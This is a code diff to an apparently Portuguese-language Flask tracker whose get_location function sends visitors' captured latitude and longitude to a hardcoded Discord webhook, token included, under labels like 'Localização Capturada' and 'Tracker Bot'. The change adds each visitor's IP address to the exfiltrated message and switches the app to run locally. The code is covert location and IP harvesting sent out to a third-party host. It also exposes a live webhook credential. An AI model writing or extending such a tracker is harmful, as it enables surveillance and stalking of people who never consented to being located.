@@ -13,6 +13,8 @@ def get_location():
     def discord_info(lat, long):
         WEBHOOK_URL = "https://discord.com/api/webhooks/1354421955381690459/0UT5Cd21QsmdpEEoa3FhD0JEfj27HDNMUmy_UhNeHlbc7V8SMOGxzwDDT6Gatj3qc3Bn"
 
+        user_ip = request.remote_addr
+
         embed = {
             "title": "Localização Capturada",
             "description": f"Latitude: {lat}, Longitude: {long}",
@@ -21,7 +23,7 @@ def get_location():
         }
 
         data = {
-            "content": f"📍 Nova localização recebida!\nLatitude: {lat}\nLongitude: {long}",
+            "content": f"📍 Nova localização recebida!\nIP: {user_ip}\nLatitude: {lat}\nLongitude: {long}",
             "username": "Tracker Bot",
             "embeds": [embed],
         }
@@ -49,5 +51,8 @@ def get_location():
 
 # Depois:
 
-def handler(request):
-    return app(request.environ, request.start_response)
+if __name__ == "__main__":
+    app.run()
+
+# def handler(request):
+#     return app(request.environ, request.start_response)
